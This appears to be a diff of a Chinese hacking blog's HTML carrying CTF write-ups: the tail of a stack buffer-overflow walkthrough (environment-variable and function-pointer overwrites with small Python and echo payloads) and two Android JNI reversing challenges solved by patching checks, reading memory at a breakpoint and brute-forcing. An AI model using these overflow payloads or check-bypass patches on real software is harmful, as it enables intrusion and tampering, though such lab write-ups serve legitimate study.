+<p>环境变量的攻击, 使用python脚本会方便一些(因为需要环境变量包括不可见字符), 使用shell的话, 需要将不可见字符用$(\x0d)这样的形式表示出来.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">import os</div><div class="line"></div><div class="line">def crack():</div><div class="line">    os.putenv(&quot;HUANJING&quot;, &quot;A&quot;*64+&quot;\x0a\x0d\x0a\x0d&quot;)</div><div class="line">    os.system(&quot;./pwn3&quot;)</div><div class="line"></div><div class="line">crack()</div></pre></td></tr></table></figure></p>
+<h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line"></div><div class="line">typedef void (*func)();</div><div class="line"></div><div class="line">void win()&#123;</div><div class="line">    printf(&quot;Pwned!\n&quot;);</div><div class="line">&#125;</div><div class="line"></div><div class="line">int main(int argc, char** argv)</div><div class="line">&#123;</div><div class="line">    func fp;</div><div class="line">    char buffer[64];</div><div class="line"></div><div class="line">    fp = NULL;</div><div class="line">    gets(buffer);</div><div class="line"></div><div class="line">    if(fp)&#123;</div><div class="line">        printf(&quot;called function pointer, jumping to 0x%08x\n&quot;, fp);</div><div class="line">        fp();</div><div class="line">    &#125;</div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>缓冲区溢出后会覆盖调用函数的指针, 导致可以执行任意函数的漏洞, 首先确定一下需要调用函数的地址.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$gdb a.out</div><div class="line">(gdb)b win</div><div class="line">Breakingpoint 1 at 0x804841a</div></pre></td></tr></table></figure></p>
+<p>可以发现断点下在了0804841a地址, 因此64位填充之后应该紧跟这个地址, 注意倒序.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">echo -e aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;\x1a\x84\x04\x08&quot; &gt; shellcode.txt</div><div class="line">./a.out &lt; shellcode.txt</div></pre></td></tr></table></figure></p>
+<p>下面没了…</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/08/12/sqzip/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Joachim Hyrathon">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hyrathon的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/08/12/sqzip/" itemprop="url">Unbenannt</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Veröffentlicht am</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-08-12T00:43:37+08:00">
+                2017-08-12
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<p>title: 神奇的zip 顺藤摸瓜<br>date: 2017-09-27 0:0:0<br>tags:</p>
+<ul>
+<li>android<br>—## 神奇的zip</li>
 </ul>
+<p>首先拿到的apk坏了, 拖到linux下<code>zip -ff testndk4_Signed4.zip</code>修复一下, 第一个知识点完成.</p>
+<p>题目是纯的Java加上存的JNI, Java下没有需要分析的逻辑.</p>
+<p>首先需要绕过一处一定会退出的检查, 修改so文件里的move r0,0为move r1,1强行返回1. 或者直接动态调在此处下断点改寄存器过去.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">super.onCreate(arg5);</div><div class="line">this.setContentView(2130903065);</div><div class="line">if(this.isExit()) &#123;</div><div class="line">    this.startActivity(new Intent(((Context)this), MainActivity.class));</div><div class="line">&#125;</div><div class="line">else &#123;</div><div class="line">    Timer v0 = new Timer();</div><div class="line">    b v1 = new b(this);</div><div class="line">    Toast.makeText(((Context)this), &quot;抱歉，请先获得权限，再进入！！&quot;, 0).show();</div><div class="line">    v0.schedule(((TimerTask)v1), 5000);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>题目有个问题对动态调试没有做任何限制,因此在最终需要比较的密码处下个断点看内存即可发现flag.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line">int __fastcall Java_com_example_testndk4_MainActivity_encodePassword(int a1)</div><div class="line">&#123;</div><div class="line">  int v1; // r5@1</div><div class="line">  const char *v2; // r7@1</div><div class="line">  char *src; // ST04_4@1</div><div class="line">  char *v4; // ST04_4@1</div><div class="line">  char *v5; // r0@2</div><div class="line">  const char *v6; // r1@2</div><div class="line">  int result; // r0@4</div><div class="line">  char v8; // [sp+8h] [bp-58h]@1</div><div class="line">  char v9; // [sp+14h] [bp-4Ch]@1</div><div class="line">  char s; // [sp+28h] [bp-38h]@1</div><div class="line">  int v11; // [sp+44h] [bp-1Ch]@1</div><div class="line"></div><div class="line">  v1 = a1;</div><div class="line">  v11 = _stack_chk_guard;</div><div class="line">  v2 = (const char *)Jstring2CStr();</div><div class="line">  j_j_memcpy(&amp;v9, &quot;thinkingInAndroid&quot;, 0x12u);</div><div class="line">  src = (char *)encodePS(&amp;v9);</div><div class="line">  j_j_memset(&amp;s, 0, 0x1Au);</div><div class="line">  j_j_strcpy(&amp;s, src);</div><div class="line">  v4 = (char *)encodePS(&amp;s);</div><div class="line">  j_j_memset(&amp;v8, 0, 0xAu);</div><div class="line">  if ( j_j_strcmp(v2, v4) )</div><div class="line">  &#123;</div><div class="line">    v5 = &amp;v8;</div><div class="line">    v6 = &quot;Sorry!&quot;;</div><div class="line">  &#125;</div><div class="line">  else</div><div class="line">  &#123;</div><div class="line">    v5 = &amp;v8;</div><div class="line">    v6 = &quot;Sucess!&quot;;</div><div class="line">  &#125;</div><div class="line">  j_j_strcpy(v5, v6);</div><div class="line">  result = (*(int (__fastcall **)(int, char *))(*(_DWORD *)v1 + 668))(v1, &amp;v8);</div><div class="line">  if ( v11 != _stack_chk_guard )</div><div class="line">    j_j___stack_chk_fail(result);</div><div class="line">  return result;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>看源码或者F5都可以发现程序是对<code>thinkingInAndroid</code>字符串做了复杂的运算,但是用户输入没有参与进来,最后将用户输入与复杂预算的结果比较, 直接在那里下断点输出:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">MOVS    R0, R7          ; s1</div><div class="line">LDR     R1, [SP,#0x60+src] ; s2</div><div class="line">--&gt; set bp here :BL      j_j_strcmp</div><div class="line">CMP     R0, #0</div><div class="line">BNE     loc_1042</div></pre></td></tr></table></figure></p>
+<p>定位到内存,得到flag:lxienietIeAehfyih</p>
+<h2 id="顺藤摸瓜"><a href="#顺藤摸瓜" class="headerlink" title="顺藤摸瓜"></a>顺藤摸瓜</h2><p>单纯的jni逻辑分析, java代码只涉及一点.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div></pre></td><td class="code"><pre><div class="line">int __fastcall Java_com_example_demo_MainActivity_check(int a1, int a2, int a3)</div><div class="line">&#123;</div><div class="line">  int v3; // r4@1</div><div class="line">  int v4; // r6@1</div><div class="line">  int v5; // r7@1</div><div class="line">  void *v6; // ST08_4@1</div><div class="line">  int v7; // r0@1</div><div class="line">  int v8; // r7@1</div><div class="line">  signed int v9; // r6@1</div><div class="line">  void *v10; // r5@2</div><div class="line">  signed int v11; // r0@4</div><div class="line">  signed int i; // r3@4</div><div class="line">  int result; // r0@7</div><div class="line">  void *src; // [sp+8h] [bp-2F0h]@1</div><div class="line">  char dest[56]; // [sp+14h] [bp-2E4h]@4</div><div class="line">  char v16[200]; // [sp+4Ch] [bp-2ACh]@4</div><div class="line">  char v17; // [sp+114h] [bp-1E4h]@4</div><div class="line">  char s; // [sp+1DCh] [bp-11Ch]@4</div><div class="line">  int v19; // [sp+2DCh] [bp-1Ch]@1</div><div class="line"></div><div class="line">  v3 = a1;</div><div class="line">  v4 = a3;</div><div class="line">  v19 = _stack_chk_guard;</div><div class="line">  v5 = (*(int (**)(void))(*(_DWORD *)a1 + 24))();</div><div class="line">  v6 = (void *)(*(int (__fastcall **)(int, const char *))(*(_DWORD *)v3 + 668))(v3, &quot;GB2312&quot;);</div><div class="line">  v7 = (*(int (__fastcall **)(int, int, const char *, const char *))(*(_DWORD *)v3 + 132))(</div><div class="line">         v3,</div><div class="line">         v5,</div><div class="line">         &quot;getBytes&quot;,</div><div class="line">         &quot;(Ljava/lang/String;)[B&quot;);</div><div class="line">  v8 = (*(int (__fastcall **)(int, int, int, void *))(*(_DWORD *)v3 + 136))(v3, v4, v7, v6);</div><div class="line">  v9 = (*(int (__fastcall **)(int, int))(*(_DWORD *)v3 + 684))(v3, v8);</div><div class="line">  src = (void *)(*(int (__fastcall **)(int, int, _DWORD))(*(_DWORD *)v3 + 736))(v3, v8, 0);</div><div class="line">  if ( v9 &lt;= 0 )</div><div class="line">  &#123;</div><div class="line">    v10 = 0;</div><div class="line">  &#125;</div><div class="line">  else</div><div class="line">  &#123;</div><div class="line">    v10 = j_j_malloc(v9 + 1);</div><div class="line">    j_j_memcpy(v10, src, v9);</div><div class="line">    *((_BYTE *)v10 + v9) = 0;</div><div class="line">  &#125;</div><div class="line">  (*(void (__fastcall **)(int, int, void *, _DWORD))(*(_DWORD *)v3 + 768))(v3, v8, src, 0);</div><div class="line">  j_j_memset(v16, 0, 0xC8u);</div><div class="line">  j_j_memset(&amp;v17, 0, 0xC8u);</div><div class="line">  j_j_memset(&amp;s, 0, 0x100u);</div><div class="line">  j_j_memcpy(dest, &amp;unk_2454, 0x38u);</div><div class="line">  v11 = j_j_strlen((const char *)v10);</div><div class="line">  for ( i = 0; i &lt; v11; ++i )</div><div class="line">    v16[i] = *((_BYTE *)v10 + i) + 97 - dest[4 * i];</div><div class="line">  v16[v11 &amp; (~v11 &gt;&gt; 31)] = 0;</div><div class="line">  n1(v16, &quot;nbrcdpassword&quot;, &amp;v17);</div><div class="line">  n2(&amp;v17, &amp;s);</div><div class="line">  result = (unsigned int)j_j_strcmp(&amp;s, &quot;7405847394833303439294822334&quot;) &lt;= 0;</div><div class="line">  if ( v19 != _stack_chk_guard )</div><div class="line">    j_j___stack_chk_fail(result);</div><div class="line">  return result;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>先贴一下F5, 其中没有用的逻辑很多, 基本就是如何如何从java拷贝到c申请内存然后到处挪.ida改的变量名没保存.变量里边<code>dest</code>有点用从内存一遍读取了一段加密向量. 然而这些都没有卵用…….<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"># 我们白白做了这么多工作</div><div class="line">#!/bin/env python</div><div class="line">#coding:utf-8</div><div class="line">import string</div><div class="line"></div><div class="line">iv1 = [0x3F,0x4D,0x6C,0x5B,0x54,0x5B,0x6C,0x5B,0x54,0x46,0x38,0x46,0x3F,0x1C]</div><div class="line">iv2 = &quot;nbrcdpassword&quot;</div><div class="line">#iv2_alpha = [ord(x) - ord(&apos;a&apos;) for x in iv2]</div><div class="line"></div><div class="line"></div><div class="line">final = &quot;7405847394833303439294822334&quot;</div><div class="line">#byte1 = [int(final[x:x+2:][::-1]) + 72 - 97 for x in range(0, len(final), 2)]</div><div class="line">byte1 = map(int, list(final))</div><div class="line">print byte1</div><div class="line"></div><div class="line">#print string.printable</div><div class="line">for i in range(14):</div><div class="line">	for k in &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_&quot;:</div><div class="line">		k1 = ord(k) - iv1[i] + 0x61 - ord(&apos;a&apos;)</div><div class="line">		k2 = (k1 + ord(iv2[i % len(iv2)]) - ord(&apos;a&apos;))%26 + 97 - 72</div><div class="line">		if k2 % 10 == byte1[2*i] and (k2/10)%10 == byte1[2*i+1]:</div><div class="line">			print k,</div><div class="line">	print</div></pre></td></tr></table></figure></p>
+<p>因为我们可以从java逻辑中发现jni做不做只影响判断, 对输出没有影响……<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">    protected void onCreate(Bundle savedInstanceState) &#123;</div><div class="line">        super.onCreate(savedInstanceState);</div><div class="line">        this.requestWindowFeature(1);</div><div class="line">        this.setContentView(2130903065);</div><div class="line">        this.D_text = this.findViewById(2131296319);</div><div class="line">        String v0 = this.D_text.getText().toString();</div><div class="line">        String v3 = &quot;&quot;;</div><div class="line">        int v2;</div><div class="line">        for(v2 = 0; v2 &lt; v0.length(); ++v2) &#123;</div><div class="line">            try &#123;</div><div class="line">                v0.charAt(v2);</div><div class="line">                v3 = String.valueOf(v3) + (((char)(v0.charAt(v2) - 8)));</div><div class="line">            &#125;</div><div class="line">            catch(Exception v1) &#123;</div><div class="line">                v3 = String.valueOf(v3) + v0.charAt(v2);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        this.D_text.setText(((CharSequence)v3));</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>上面的代码, 当jni执行了或者被绕过之后, 逻辑是对一段R中的烫烫烫进行了移位.<br><code>碸夼圸烁Ｂ夲皅卟跷:叿 + 8 = 西电的校址会面 = flag</code></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
 
 
-        <!-- Sidebar Footer -->
-        <!--
-I'm glad you use this theme, the development is no so easy, I hope you can keep the copyright, I will thank you so much.
-If you still want to delete the copyrights, could you still retain the first one? Which namely "Theme Material"
-It will not impact the appearance and can give developers a lot of support :)
+    
+  </section>
 
-很高兴您使用并喜欢该主题，开发不易 十分谢谢与希望您可以保留一下版权声明。
-如果您仍然想删除的话 能否只保留第一项呢？即 "Theme Material"
-它不会影响美观并可以给开发者很大的支持和动力。 :)
--->
-
-<!-- Sidebar Divider -->
-
-    <div class="sidebar-divider"></div>
+  
+  <nav class="pagination">
+    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
+  </nav>
 
 
-<!-- Theme Material -->
 
-    <a href="https://github.com/viosey/hexo-theme-material"  class="sidebar-footer-text-a" target="_blank">
-        <div class="sidebar-text mdl-button mdl-js-button mdl-js-ripple-effect sidebar-footer-text-div" data-upgraded=",MaterialButton,MaterialRipple">
-            Theme - Material
-            <span class="sidebar-badge badge-circle">i</span>
+          </div>
+          
+
+
+          
+
         </div>
-    </a>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview sidebar-panel sidebar-panel-active">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.gif"
+               alt="Joachim Hyrathon" />
+          <p class="site-author-name" itemprop="name">Joachim Hyrathon</p>
+           
+              <p class="site-description motion-element" itemprop="description">三流逆向工程师的N流PWNer之旅</p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives/">
+                <span class="site-state-item-count">17</span>
+                <span class="site-state-item-name">Artikel</span>
+              </a>
+            </div>
+          
+
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              
+                <span class="site-state-item-count">12</span>
+                <span class="site-state-item-name">Tags</span>
+              
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+
+        
 
 
-<!-- Help & Support -->
-<!--
+      </section>
 
--->
+      
 
-<!-- Feedback -->
-<!--
-
--->
-
-<!-- About Theme -->
-<!--
-
--->
+      
 
     </div>
+  </aside>
 
-    <!-- Sidebar Image -->
-    
 
-</aside>
+        
+      </div>
+    </main>
 
-                    
-
-                    
-                        <!-- Footer Top Button -->
-                        <div id="back-to-top" class="toTop-wrap">
-    <a href="#top" class="toTop">
-        <i class="material-icons footer_top-i">expand_less</i>
-    </a>
-</div>
-
-                    
-
-                    <!--Footer-->
-<footer class="mdl-mini-footer" id="bottom">
-    
-        <!-- Paradox Footer Left Section -->
-        <div class="mdl-mini-footer--left-section sns-list">
-    <!-- Twitter -->
-    
-        <a href="https://twitter.com/twitter" target="_blank">
-            <button class="mdl-mini-footer--social-btn social-btn footer-sns-twitter">
-                <span class="visuallyhidden">Twitter</span>
-            </button><!--
-     --></a>
-    
-
-    <!-- Facebook -->
-    
-        <a href="https://www.facebook.com/facebook" target="_blank">
-            <button class="mdl-mini-footer--social-btn social-btn footer-sns-facebook">
-                <span class="visuallyhidden">Facebook</span>
-            </button><!--
-     --></a>
-    
-
-    <!-- Google + -->
-    
-        <a href="https://www.google.com/" target="_blank">
-            <button class="mdl-mini-footer--social-btn social-btn footer-sns-gplus">
-                <span class="visuallyhidden">Google Plus</span>
-            </button><!--
-     --></a>
-    
-
-    <!-- Weibo -->
-    
-
-    <!-- Instagram -->
-    
-
-    <!-- Tumblr -->
-    
-
-    <!-- Github -->
-    
-
-    <!-- LinkedIn -->
-    
-
-    <!-- Zhihu -->
-    
-
-    <!-- Bilibili -->
-    
-
-    <!-- Telegram -->
-    
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2017</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Joachim Hyrathon</span>
 </div>
 
 
-        <!--Copyright-->
-        <div id="copyright">
-            Copyright&nbsp;©<script type="text/javascript">var fd = new Date();document.write("&nbsp;" + fd.getFullYear() + "&nbsp;");</script>Hyrathon的博客
-        </div>
+<div class="powered-by">
+  Erstellt mit  <a class="theme-link" href="https://hexo.io">Hexo</a>
+</div>
 
-        <!-- Paradox Footer Right Section -->
+<div class="theme-info">
+  Theme -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Muse
+  </a>
+</div>
 
-        <!--
-        I am glad you use this theme, the development is no so easy, I hope you can keep the copyright.
-        It will not impact the appearance and can give developers a lot of support :)
 
-        很高兴您使用该主题，开发不易，希望您可以保留一下版权声明。
-        它不会影响美观并可以给开发者很大的支持。 :)
-        -->
+        
 
-        <div class="mdl-mini-footer--right-section">
-            <div>
-                <div class="footer-develop-div">Powered by <a href="https://hexo.io" target="_blank" class="footer-develop-a">Hexo</a></div>
-                <div class="footer-develop-div">Theme - <a href="https://github.com/viosey/hexo-theme-material" target="_blank" class="footer-develop-a">Material</a></div>
-            </div>
-        </div>
+        
+      </div>
+    </footer>
+
     
-</footer>
-
-
-                    <!-- Import File -->
-
-
-    <script>lsloader.load("js/lazyload.min.js","/js/lazyload.min.js?1BcfzuNXqV+ntF6gq+5X3Q==")</script>
-    <script>lsloader.load("js/js.min.js","/js/js.min.js?oAl/+lvaqTFV31JXTmbrNA==")</script>
-
-
-
-    <script>lsloader.load("js/nprogress.js","/js/nprogress.js?pl3Qhb9lvqR1FlyLUna1Yw==")</script>
-
-
-<script type="text/ls-javascript" id="NProgress-script">
-    NProgress.configure({
-        showSpinner: true
-    });
-    NProgress.start();
-    $('#nprogress .bar').css({
-        'background': '#29d'
-    });
-    $('#nprogress .peg').css({
-        'box-shadow': '0 0 10px #29d, 0 0 15px #29d'
-    });
-    $('#nprogress .spinner-icon').css({
-        'border-top-color': '#29d',
-        'border-left-color': '#29d'
-    });
-    setTimeout(function() {
-        NProgress.done();
-        $('.fade').removeClass('out');
-    }, 800);
-</script>
-
-
-
-
-
-
-
-
-
-
-
-
-
-<!-- UC Browser Compatible -->
-<script>
-	var agent = navigator.userAgent.toLowerCase();
-	if(agent.indexOf('ucbrowser')>0) {
-		document.write('<link rel="stylesheet" href="/css/uc.css">');
-	   alert('由于 UC 浏览器使用极旧的内核，而本网站使用了一些新的特性。\n为了您能更好的浏览，推荐使用 Chrome 或 Firefox 浏览器。');
-	}
-</script>
-
-<!-- Window Load-->
-<script type="text/ls-javascript" id="window-load">
-    $(window).on('load', function() {
-        // Post_Toc parent position fixed
-        $('.post-toc-wrap').parent('.mdl-menu__container').css('position', 'fixed');
-    });
-</script>
-
-<!-- MathJax Load-->
-
-<script type="text/ls-javascript" id="lazy-load">
-    // Offer LazyLoad
-    queue.offer(function(){
-        $('.lazy').lazyload({
-            effect : 'show'
-        });
-    });
-
-    // Start Queue
-    $(document).ready(function(){
-        setInterval(function(){
-            queue.execNext();
-        },200);
-    });
-</script>
-
-<!-- Bing Background -->
-
-
-<script>
-    (function(){
-        var scriptList = document.querySelectorAll('script[type="text/ls-javascript"]')
-
-        for (var i = 0; i < scriptList.length; ++i) {
-            var item = scriptList[i];
-            lsloader.runInlineScript(item.id,item.id);
-        }
-    })()
-console.log('\n %c © Material Theme | Version: 1.4.0 | https://github.com/viosey/hexo-theme-material %c \n', 'color:#455a64;background:#e0e0e0;padding:5px 0;border-top-left-radius:5px;border-bottom-left-radius:5px;', 'color:#455a64;background:#e0e0e0;padding:5px 0;border-top-right-radius:5px;border-bottom-right-radius:5px;');
-</script>
-
-                </main>
-            </div>
-        </body>
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
     
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.2"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.2"></script>
+
+
+
+  
+  
+
+  
+    <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>
+
+  
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
 </html>
